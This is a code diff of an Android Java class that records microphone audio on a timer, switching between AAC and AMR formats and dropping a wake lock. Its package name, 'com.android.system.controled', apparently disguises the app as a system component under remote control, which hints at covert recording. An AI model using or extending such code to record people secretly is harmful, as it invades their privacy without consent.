@@ -7,11 +7,10 @@ import android.content.Context;
 import android.media.MediaRecorder;
 import android.os.Handler;
 import android.os.Message;
-import android.os.PowerManager;
-import android.os.PowerManager.WakeLock;
 import android.telephony.TelephonyManager;
 
 import com.android.system.controled.Debug;
+import com.android.system.controled.MainApplication;
 
 @SuppressLint({ "Wakelock", "InlinedApi" })
 public class RecorderUtil {
@@ -20,7 +19,7 @@ public class RecorderUtil {
 	private MediaRecorder mRecorder;
 	private boolean isRecording;
 
-	private WakeLock wakeLock;
+	// private WakeLock wakeLock;
 	private Context mContext;
 
 	private Handler mHandler;
@@ -38,63 +37,73 @@ public class RecorderUtil {
 			mRecorderUtil = new RecorderUtil();
 			mRecorderUtil.mContext = context;
 			mRecorderUtil.mRecorder = new MediaRecorder();
-			mRecorderUtil.wakeLock = ((PowerManager) context.getSystemService(Context.POWER_SERVICE)).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RecorderUtil");
+			// mRecorderUtil.wakeLock = ((PowerManager)
+			// context.getSystemService(Context.POWER_SERVICE)).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
+			// "RecorderUtil_recorder");
 		}
 
 		return mRecorderUtil;
 	}
 
-	public boolean startRecorder(File saveFile, int timeMinute) {
+	public boolean startRecorder(String saveFileName, int timeMinute) {
 
 		if (isRecording) {
 			Debug.e("", "正在录音，务须再录！");
 			return false;
 		}
 
-		Debug.e("", "startRecorder=" + saveFile.getAbsolutePath());
+		if (mRecorder == null) {
+			mRecorder = new MediaRecorder();
+		}
+
+		String saveFilePath = "";
 		boolean result = false;
 		try {
-			mRecorder.reset();
 			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-
-			mRecorder.setAudioSamplingRate(44100);// 22050
-			mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-
-			// mRecorder.setAudioSamplingRate(8000);//16000
-			// mRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
-			// mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_WB);//MediaRecorder.AudioEncoder.AMR_NB与16000对应
-
-			mRecorder.setOutputFile(saveFile.getAbsolutePath());
-
+			if (MainApplication.RECORDER_HIGH_QUALITY) {
+				saveFilePath = saveFileName + ".3gpp";
+				mRecorder.setAudioSamplingRate(44100);// 22050
+				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+				mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+			} else {
+				saveFilePath = saveFileName + ".amr";
+				mRecorder.setAudioSamplingRate(16000);// 8000
+				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
+				mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);// AMR_NB与16000对应 AMR_MB与8000对应
+			}
 			if (timeMinute > 0) {
 				// mRecorder.setMaxDuration(timeMinute * 60 * 1000);
-				mHandler = new Mainhandler();
+				if (mHandler == null) {
+					mHandler = new Mainhandler();
+				}
 				mHandler.sendEmptyMessageDelayed(MSG_HANDLER_STOP, timeMinute * 60000);
 				mHandler.sendEmptyMessageDelayed(MSG_HANDLER_STOP_MAX_TIME, RECORDER_MAX_TIME);
 			}
 
-			if (!saveFile.getParentFile().exists()) {
-				saveFile.getParentFile().mkdir();
+			if (!(new File(saveFilePath)).getParentFile().exists()) {
+				(new File(saveFilePath)).getParentFile().mkdirs();
 			}
-			// if (!file.exists()) {
-			// file.createNewFile();
-			// }
-			mRecorder.setOutputFile(saveFile.toString());
+			if (!(new File(saveFilePath)).exists()) {
+				(new File(saveFilePath)).createNewFile();
+			}
+			mRecorder.setOutputFile(saveFilePath);
 			mRecorder.prepare();
 			mRecorder.start();
 			result = true;
 			isRecording = true;
-			wakeLock.acquire();
+			// wakeLock.acquire();
+			Debug.e("", "startRecorder=" + saveFilePath);
 		} catch (Exception e) {
+			result = false;
+			isRecording = false;
 			mHandler.removeMessages(MSG_HANDLER_STOP);
 			mHandler.removeMessages(MSG_HANDLER_STOP_MAX_TIME);
 			mRecorder.reset();
 			mRecorder.release();
 			mRecorder = null;
-			wakeLock.release();
-			if (saveFile.exists()) {
-				saveFile.delete();
+			// wakeLock.release();
+			if ((new File(saveFilePath)).exists()) {
+				(new File(saveFilePath)).delete();
 			}
 			e.printStackTrace();
 		}
@@ -103,12 +112,12 @@ public class RecorderUtil {
 	}
 
 	public void stopRecorder() {
-		Debug.e("", "stopRecorder");
+		Debug.e("RecorderUtil", "stopRecorder");
 		if (mRecorder != null) {
 			try {
-				if (wakeLock != null) {
-					wakeLock.release();
-				}
+				// if (wakeLock != null) {
+				// wakeLock.release();
+				// }
 				isRecording = false;
 				mRecorder.stop();
 				mRecorder.reset();
